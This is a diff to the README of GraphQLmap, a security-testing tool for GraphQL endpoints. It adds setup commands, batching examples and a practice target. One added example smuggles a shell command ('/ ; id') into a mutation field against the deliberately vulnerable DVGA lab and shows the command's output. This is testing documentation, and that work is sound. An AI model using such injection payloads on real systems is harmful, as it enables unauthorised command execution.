@@ -7,8 +7,8 @@
 * [Features and examples](#features-and-examples)
   - [Dump a GraphQL schema](#dump-a-graphql-schema)
   - [Interact with a GraphQL endpoint](#interact-with-a-graphql-endpoint)
-  - Execute GraphQL queries
-  - Autocomplete queries
+  - [Execute GraphQL queries](#)
+  - [Autocomplete queries](#)
   - [GraphQL field fuzzing](#graphql-field-fuzzing)
     - [Example 1 - Bruteforce a character](#example-1---bruteforce-a-character)
     - [Example 2 - Iterate over a number](#example-2---iterate-over-a-number)
@@ -44,6 +44,16 @@ optional arguments:
   --headers [HEADERS]  HTTP Headers sent to /graphql endpoint
   --json [USE_JSON]    Use JSON encoding, implies POST
   --proxy [PROXY]      HTTP proxy to log requests
+```
+
+Development setup
+
+```ps1
+python -m venv .venv
+source .venv/bin/activate
+pip install --editable .
+pip install -r requirements.txt
+./bin/graphqlmap -u http://127.0.0.1:5013/graphql
 ```
 
 
@@ -110,6 +120,21 @@ GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin
 }
 ```
 
+It also works with `mutations`, they must be written in a single line.
+
+```ps1
+# ./bin/graphqlmap -u http://127.0.0.1:5013/graphql --proxy http://127.0.0.1:8080 --method POST
+GraphQLmap > mutation { importPaste(host:"localhost", port:80, path:"/ ; id", scheme:"http"){ result }}
+{
+    "data": {
+        "importPaste": {
+            "result": "uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"
+        {
+    {
+{
+```
+
+
 ### GraphQL field fuzzing
 
 Use `GRAPHQL_INCREMENT` and `GRAPHQL_CHARSET` to fuzz a parameter.      
@@ -168,6 +193,21 @@ GraphQLmap > { paste(pId: "9") {id,title,content,public,userAgent} }
 }
 ```
 
+### GraphQL Batching
+
+GraphQL supports Request Batching. Batched requests are processed one after the other by GraphQL
+Use `BATCHING_PLACEHOLDER` before a query to send it multiple times inside a single request.
+
+```ps1
+GraphQLmap > BATCHING_3 {__schema{ types{namea}}}
+[+] Sending a batch of 3 queries
+[+] Successfully received 3 outputs
+
+GraphQLmap > BATCHING_2 {systemUpdate}
+[+] Sending a batch of 2 queries
+[+] Successfully received 2 outputs
+```
+
 ### NoSQLi injection
 
 Use `BLIND_PLACEHOLDER` inside the query for the `nosqli` function.    
@@ -192,11 +232,11 @@ GraphQLmap > mssqli
 
 ## Practice
 
-* [Damn Vulnerable GraphQL Application - @dolevf](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/blob/master/setup.py)
+* [Damn Vulnerable GraphQL Application - @dolevf](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/blob/master/setup.py) : `docker run -t -p 5013:5013 -e WEB_HOST=0.0.0.0 dolevf/dvga`
 
 ## TODO
 
-* GraphQL Field Suggestions : Find 
+* GraphQL Field Suggestions
 * Generate mutation query
 * Unit tests
 * Handle node
